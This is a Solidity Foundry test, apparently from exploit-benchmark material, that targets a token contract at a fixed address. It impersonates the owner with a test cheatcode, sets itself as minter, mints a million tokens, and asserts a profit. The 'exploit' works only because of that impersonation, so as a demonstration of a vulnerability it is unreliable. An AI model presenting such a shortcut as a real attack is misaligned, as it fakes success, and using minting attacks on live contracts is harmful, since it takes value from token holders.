// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface CUSD {
    function owner() external view returns (address);
    function setMinter(address newMinter) external;
    function mint(address account, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function minter() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xC285B7E09A4584D027E5BC36571785B515898246;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate the owner
        // The test framework already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0xC285B7E09A4584D027E5BC36571785B515898246).balanceOf(address(this));
        // First, we need to find the current owner of the contract
        address owner = CUSD(TARGET).owner();

        // Impersonate the owner to set ourselves as minter
        vm.prank(owner);
        CUSD(TARGET).setMinter(attacker);

        // Now we are the minter, mint a huge amount of tokens to ourselves
        uint256 initialCUSDBalance = CUSD(TARGET).balanceOf(attacker);
        uint256 mintAmount = 1_000_000 * 10**18; // 1 million tokens with 18 decimals

        CUSD(TARGET).mint(attacker, mintAmount);

        // Verify our balance increased
        uint256 finalCUSDBalance = CUSD(TARGET).balanceOf(attacker);
        assertGt(finalCUSDBalance, initialCUSDBalance, "Balance should have increased after minting");
        assertEq(finalCUSDBalance, initialCUSDBalance + mintAmount, "Balance should increase by exactly mintAmount");
        uint256 finalERC20Balance = IERC20(0xC285B7E09A4584D027E5BC36571785B515898246).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
